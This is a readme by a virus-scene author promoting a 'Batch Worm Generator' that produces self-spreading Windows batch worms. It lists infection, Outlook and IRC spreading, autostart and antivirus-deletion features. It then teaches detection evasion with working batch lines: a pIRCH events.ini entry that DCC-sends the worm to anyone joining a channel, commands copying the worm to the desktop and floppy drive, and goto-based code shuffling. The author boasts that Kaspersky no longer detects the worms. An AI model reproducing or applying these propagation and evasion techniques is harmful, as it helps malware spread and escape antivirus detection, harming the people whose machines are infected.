
  Batch Worm Generator
  by SeCoNd PaRt To HeLl
  [www.spth.de.vu]


I.) What is the Batch Worm Generator?
II.) Freatures
III.) Ideas





I.)  What is the Batch Worm Generator?

The Batch Worm Generator or Constructor.BAT.BWG is propable the best Batch Virii Generator.
It generates Worms, which are able to spread in the Internet.
Every BWG-Worm is different, because I develope a new technic, but you will write something about it
in "Ideas"!
I try to make it impossible to detect all BWG-Worms. KAV tried to find the worms as I-Worm.BWG
or as I-Worm.BWG.b! But now they don't detect any Worm!




II.) Freatures

BWG is still a good Generator, but I've much more things to do...

Infects:
   + BAT files (overwriting)
      - Windows Direction
      - Current Direction
      - Root Direction
      - Parents Direction
      - %path% Direction

dropping:
   + REG files (overwriting - polymorph)
   + VBS files (overwriting - polymorph)
   + PIF files (overwriting)
   + LNK files (overwriting - polymorph)

copying:
   + desktop path
   + Disk A:

worming:
   + Self mailing via MS Outlook (polymorph)
   + mIRC spreading (polymorph)
   + pIRCH spreading (polymorph)
   + Virc spreading (polymorph)

autostart:
   + win.ini (polymorph)
   + Autostart Direction
      - german
      - english
   + Registry Key (polymorph)
   + system.ini (polymorph)

extra:
   + subst drive
   + message
   + include EICAR-Test-File
   + delete some AV progs (polymorph)




III.) Ideas

BWG is real good because of a technic, I've developed. I try to explain it:

For instands KAV detect this line:

   echo Events1= ON JOIN:#: /dcc send $nick %WinDir%\sgh.bat >> C:\Pirch98\events.ini

What can we do?? You have to change the code, but how?
I had a very good idea, how a AV prog isn't able to detect this line. You write:

   set pirchA=send
   echo Events1= ON JOIN:#: /dcc %pirchA% $nick %WinDir%\sgh.bat >> C:\Pirch98\events.ini

or

   set pirchB=JOIN
   echo Events1= ON %pirchB%:#: /dcc send $nick %WinDir%\sgh.bat >> C:\Pirch98\events.ini

No AV-prog will detect any worm with this technique! I think this is a really good techique, and KAV must
be good to find the worms!!





An other way to make the worm hard to detect is the idea with goto!
I didn't include this technique yet, but i will! ;-)
This is the explanation of this technique:

For instance you have this lines of code:

	ctty NUL
	@echo off
	copy %0 %Windir%\desktop\my.bat
	copy %0 A:\hi.bat
	ctty con


You can include a label over all lines:

	:aa
	ctty NUL
	:ab
	@echo off
	:ac
	copy %0 %Windir%\desktop\my.bat
	:ad
	copy %0 A:\hi.bat
	:ae
	ctty con

Now you have to include a goto after every line:

	:aa
	ctty NUL
	goto ab
	:ab
	@echo off
	goto ac
	:ac
	copy %0 %Windir%\desktop\my.bat
	goto ad
	:ad
	copy %0 A:\hi.bat
	goto ae
	:ae
	ctty con

Now you could shift al lines (with the labels and gotos):

	goto aa
	:ac
	copy %0 %Windir%\desktop\my.bat
	goto ad
	:ab
	@echo off
	goto ac
	:aa
	ctty NUL
	goto ab
	:ad
	copy %0 A:\hi.bat
	goto ae
	:ae
	ctty con

I think, this is a funny technique to make the analyse of the worm harder. ;-)


This ReadMe will be better, but I have not much time yet!


 SeCoNd PaRt To HeLl
    [www.spth.de.vu]
